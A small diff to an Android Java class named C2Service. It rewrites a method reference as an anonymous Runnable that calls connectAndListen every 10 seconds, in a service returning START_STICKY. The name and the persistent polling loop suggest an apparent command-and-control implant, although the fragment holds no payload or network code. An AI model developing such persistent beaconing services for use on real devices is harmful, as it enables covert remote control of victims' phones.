@@ -27,7 +27,12 @@ public class C2Service extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         scheduler = Executors.newSingleThreadScheduledExecutor();
-        scheduler.scheduleWithFixedDelay(this::connectAndListen, 0, 10, TimeUnit.SECONDS);
+        scheduler.scheduleWithFixedDelay(new Runnable() {
+            @Override
+            public void run() {
+                connectAndListen();
+            }
+        }, 0, 10, TimeUnit.SECONDS);
         return START_STICKY;
     }
 
